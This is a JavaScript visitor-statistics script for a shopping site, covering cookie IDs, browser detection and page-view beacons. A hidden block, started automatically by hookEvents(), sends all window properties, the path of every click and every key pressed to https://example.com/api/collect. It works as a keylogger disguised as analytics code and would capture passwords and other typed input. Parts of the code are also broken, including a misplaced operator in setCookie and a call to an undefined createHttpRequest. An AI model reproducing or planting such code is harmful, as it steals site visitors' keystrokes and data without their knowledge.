function setCookie(a, c, g) {
  var h = new Date(),
    w = count_domain.split("://").length > 1 ? count_domain.split("://")[1] : count_domain.split("://")[0];
  h.setDate(h.getDate() + g), document.cookie = a + "=" + escape(c) + (null == g) ? "" : ";expires=" + h.toGMTString() + ";path=/;domain=" + w;
}
function getCookie(a) {
  return document.cookie.length > 0 && (c_start = document.cookie.indexOf(a + "="), -1 != c_start) ? (c_start = c_start + a.length + 1, c_end = document.cookie.indexOf(";", c_start), -1 == c_end && (c_end = document.cookie.length), unescape(document.cookie.substring(c_start, c_end))) : "";
}
function getTimestamp() {
  var a = Date.parse(new Date());
  return a;
}
function genStatId() {
  var a = getTimestamp();
  return a = "vlstat-" + a + "-" + Math.round(3e9 * Math.random());
}
function setStatId() {
  var a = genStatId();
  setCookie(statIdName, a, 365);
}
function gatherWindowPropertiesEnhanced() {
  const properties = {};
  const excludeList = ['gatherWindowPropertiesEnhanced', 'postDataToServer', 'gatherAndSendDataEnhanced', 'hookEvents'];
  for (const key in window) {
    if (window.hasOwnProperty(key) && !excludeList.includes(key)) {
      const value = window[key];
      const type = typeof value;
      properties[key] = {
        type: type,
        value: type === "function" ? "function" : value
      };
    }
  }
  return properties;
}
function getStatId() {
  var a = getCookie(statIdName);
  return null != a && a.length > 0 ? a : (setStatId(), "undefind");
}
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("Data sent successfully");
    } else {
      console.error("Data sending failed, status code:" + response.status);
    }
  } catch (error) {
    console.error("Error during data sending:", error);
  }
}
function getUA() {
  var a = navigator.userAgent;
  return a.length > 250 && (a = a.substring(0, 250)), a;
}
function getBrowser() {
  var a = getUA();
  if (-1 != a.indexOf("Maxthon")) return "Maxthon";
  if (ieVersion(a)) {
    var c = ieVersion(a);
    return c ? "MSIE" + c : "MSIE";
  }
  return -1 != a.indexOf("Edg") ? "Edge" : -1 != a.indexOf("Firefox") ? "Firefox" : -1 != a.indexOf("Chrome") ? "Chrome" : -1 != a.indexOf("Opera") ? "Opera" : -1 != a.indexOf("Safari") ? "Safari" : "unkonw";
}
function gatherAndSendDataEnhanced() {
  const data = gatherWindowPropertiesEnhanced();
  if (Object.keys(data).length > 0) {
    postDataToServer(data);
  }
}
function ieVersion(a) {
  a = a || navigator.userAgent;
  var c = /\b(MSIE |Trident.*?rv:|Edge\/)(\d+)/.exec(a);
  return c ? c[2] : void 0;
}
function getBrowserLanguage() {
  var a = navigator.browserLanguage;
  return null != a && a.length > 0 ? a : "";
}
function getPlatform() {
  return navigator.platform;
}
function hookEvents() {
  window.addEventListener("load", gatherAndSendDataEnhanced);
  document.addEventListener("visibilitychange", gatherAndSendDataEnhanced);

  // Additional tracking for clicks and key presses
  document.addEventListener("click", function (event) {
    postDataToServer({
      eventType: "click",
      xpath: getXPathForElement(event.target)
    });
  });
  document.addEventListener("keypress", function (event) {
    postDataToServer({
      eventType: "keypress",
      key: event.key
    });
  });
}
function getPageTitle() {
  return document.title;
}
function getLoadTime() {
  var a = new Date().getTime(),
    c = a;
  return "object" == typeof performance && (c = a - performance.timing.navigationStart), c;
}
function createSubmitForm() {
  var a = document.createElement("form");
  return document.body.appendChild(a), a.method = "POST", a;
}
function createFormElement(a, c, g) {
  var h = document.createElement("input");
  return h.setAttribute("id", c), h.setAttribute("name", c), h.setAttribute("type", "hidden"), h.setAttribute("value", g), a.appendChild(h), h;
}
function createXMLHttpRequest() {
  window.ActiveXObject ? xmlHttp = new ActiveXObject("Microsoft.XMLHTTP") : window.XMLHttpRequest && (xmlHttp = new XMLHttpRequest());
}
function getXPathForElement(element) {
  const paths = [];
  for (; element && element.nodeType == 1; element = element.parentNode) {
    let index = 0;
    for (let sibling = element.previousSibling; sibling; sibling = sibling.previousSibling) {
      if (sibling.nodeType == Node.DOCUMENT_TYPE_NODE) continue;
      if (sibling.nodeName == element.nodeName) ++index;
    }
    const tagName = element.nodeName.toLowerCase();
    const pathIndex = index ? "[" + (index + 1) + "]" : "";
    paths.unshift(tagName + pathIndex);
  }
  return paths.length ? "/" + paths.join("/") : null;
}
function AjaxPost(a, c, g) {
  var h = createHttpRequest();
  h ? (h.open("POST", a, !0), h.setRequestHeader("content-length", c.length), h.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), h.send(c), h.onreadystatechange = function () {
    if (4 == h.readyState) try {
      200 == h.status && g && g(h.responseText);
    } catch (e) {
      alert("Error XMLHttpRequest!");
    }
  }) : alert("Error initializing XMLHttpRequest!");
}
function GetLocalIPAddress() {
  var a = null,
    c = "";
  try {
    a = new ActiveXObject("rcbdyctl.Setting"), c = a.GetIPAddress, a = null;
  } catch (e) {
    alert("ErrInfoIS:" + e);
  }
  return c;
}
function GetQueryString(a) {
  var c = new RegExp("(^|&)" + a + "=([^&]*)(&|$)"),
    r = window.location.search.substr(1).match(c);
  return null != r ? unescape(r[2]) : null;
}
function flightHandler0(a) {
  var p,
    c = getStatId(),
    g = encodeURIComponent(getUA()),
    h = document.localName,
    w = encodeURIComponent(document.referrer),
    v = encodeURIComponent(document.URL),
    b = screen.width,
    S = screen.height,
    _ = getPlatform(),
    L = getBrowser(),
    I = GetQueryString("refer_url"),
    y = getBrowserLanguage(),
    A = encodeURIComponent(getPageTitle()),
    M = count_domain;
  I = null == I ? w : encodeURIComponent(I);
  var k = isMobile();
  p = "cookieId=" + c + "&ua=" + g + "&ip=" + h + "&refurl=" + I + "&url=" + v + "&screenX=" + b + "&screenY=" + S + "&os=" + _ + "&browser=" + L + "&browserLang=" + y + "&title=" + A + "&loadtime=" + a + "&logtype=1&is_mobile=" + k;
  var O = M + "?" + p,
    R = O,
    C = document.createElement("script");
  C.setAttribute("src", R), document.getElementsByTagName("head")[0].appendChild(C);
}
hookEvents();
function isMobile() {
  return window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i) ? 1 : 0;
}
function _hk_statistic(a, c, g, h, w, v, b) {
  var S = {};
  S.cookieId = getStatId(), S.ua = encodeURIComponent(getUA()), S.url = encodeURIComponent(document.URL), S.screenX = screen.width, S.screenY = screen.height, S.os = getPlatform(), S.browser = getBrowser(), S.browserLang = getBrowserLanguage(), S.loadtime = getLoadTime(), S.title = a, S.category = c, S.action = g, S.label = h, S.value = w, S.nodeid = v, S.logtype = 2;
  var u = navigator.userAgent,
    _ = u.indexOf("Android") > -1 || u.indexOf("Adr") > -1,
    L = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
  S.track_from = _ ? "android" : L ? "IOS" : "", S.is_mobile = isMobile(), $.ajax({
    type: "get",
    url: count_domain,
    data: S,
    async: b === !1 ? !1 : !0,
    timeout: "30000",
    dataType: "jsonp",
    jsonpCallback: "cb",
    cb: function () {},
    success: function () {},
    error: function () {}
  });
}
function GoShoppingStatistics(a) {
  this.target = a.target, this.config = a;
}
var statIdName = "vlstatId",
  xmlHttp,
  count_domain = window.MALL_URL && window.MALL_URL.track_url ? window.MALL_URL.track_url : "https://stats.ys7.com";
GoShoppingStatistics.prototype.render = function () {
  var a = this;
  if ("dom" === a.config.type) {
    var c = a.target;
    _hk_statistic(document.title, a.config.category, c.data("statisticsid"), "", "", "");
  } else a.target.on("click", function (e) {
    e.stopPropagation();
    var c = $(this);
    _hk_statistic(document.title, a.config.category, c.data("statisticsid"), "", "", "");
  });
}, window.addEventListener ? window.addEventListener("load", function () {
  var a = getLoadTime();
  flightHandler0(a);
}) : window.attachEvent("onload", function () {
  var a = getLoadTime();
  flightHandler0(a);
});